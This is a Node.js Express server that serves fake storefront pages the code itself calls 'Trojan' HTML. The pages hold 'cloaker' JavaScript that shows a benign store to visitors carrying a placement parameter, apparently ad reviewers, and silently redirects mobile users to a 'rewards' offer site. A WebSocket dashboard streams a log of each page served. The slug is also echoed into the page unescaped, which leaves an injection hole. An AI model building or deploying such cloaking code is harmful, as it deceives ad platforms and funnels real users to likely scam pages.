const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://rewards-for-all.com/${offer}.html`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to our Store!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served ${offer} Trojan (${slug})`);
});

// Start the HTTP server
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// DASHBOARD
const wss = new WebSocket.Server({ port: 8081 });

// Function to send console messages to all connected clients
function sendToClients(message) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
}

// Intercept console.log and redirect to WebSocket clients
const originalLog = console.log;
console.log = function(...args) {
    const message = args.join(' ');
    sendToClients(message);
    originalLog(...args);
};

// WebSocket connection handling
wss.on('connection', ws => {
    console.log('Client connected.');
    
    ws.on('close', () => {
        console.log('Client disconnected.');
    });
});
